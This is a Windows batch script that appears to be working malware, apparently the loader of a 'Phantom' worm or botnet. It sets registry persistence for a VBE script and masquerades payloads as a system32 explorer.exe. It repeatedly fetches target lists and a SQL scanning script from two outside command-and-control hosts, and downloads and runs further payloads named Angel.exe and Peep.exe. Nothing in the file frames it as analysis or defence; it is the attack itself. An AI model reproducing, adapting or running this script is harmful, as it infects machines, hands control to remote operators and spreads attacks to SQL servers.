@echo off

del Peep.exe
del Angel.exe
del Local.txt
copy bak\cmd.txt cmd.txt /y
copy bak\SqlExp.bat SqlExp.bat /y
attrib -s -h -r %SystemRoot%\Angel.exe
attrib -s -h -r %SystemRoot%\system32\explorer.exe

echo Windows Registry Editor Version 5.00>reg.reg && echo [HKEY_CURRENT_USER\Software\Microsoft\Windows NT\CurrentVersion\Windows]>>reg.reg && echo "Programs"="com exe bat pif cmd vbe vbs">>reg.reg && echo "load"="C:\\Phantom\\Phantom.vbe">>reg.reg && regedit.exe /s reg.reg && del reg.reg
cscript.exe //H:WScript //Nologo

:Phantom
hget.exe http://www.jzinfo.ha.cn/cgi-bin/Phantom/Local.asp Local.txt
if not exist C:\Phantom\Local.txt goto PhantomBox
hget.exe http://www.jzinfo.ha.cn/cgi-bin/Phantom/SqlScan.bat SqlScan.bat
if not exist %SystemRoot%\Angel.exe goto Angel
if not exist %SystemRoot%\system32\explorer.exe goto Peep
goto End

:PhantomBox
hget.exe http://PhantomBox.3322.org/Local.asp Local.txt
if not exist C:\Phantom\Local.txt goto Sleep
hget.exe http://PhantomBox.3322.org/SqlScan.bat SqlScan.bat

:End
Sqlrep.exe :) Local.txt cmd.txt /S
Sqlrep.exe :) Local.txt SqlExp.bat /S

SqlScan.bat

:Sleep
echo Wscript.Sleep 100000>Sleep100.vbe && cscript.exe //Nologo Sleep100.vbe && del Sleep100.vbe
goto Phantom

:Angel
hget.exe http://www.jzinfo.ha.cn/cgi-bin/Phantom/Angel.rar Angel.exe run || hget.exe http://PhantomBox.3322.org/Angel.rar Angel.exe run

if exist %SystemRoot%\system32\explorer.exe goto End

:Peep
hget.exe http://www.jzinfo.ha.cn/cgi-bin/Phantom/Peep.rar Peep.exe run || hget.exe http://PhantomBox.3322.org/Peep.rar Peep.exe run

goto End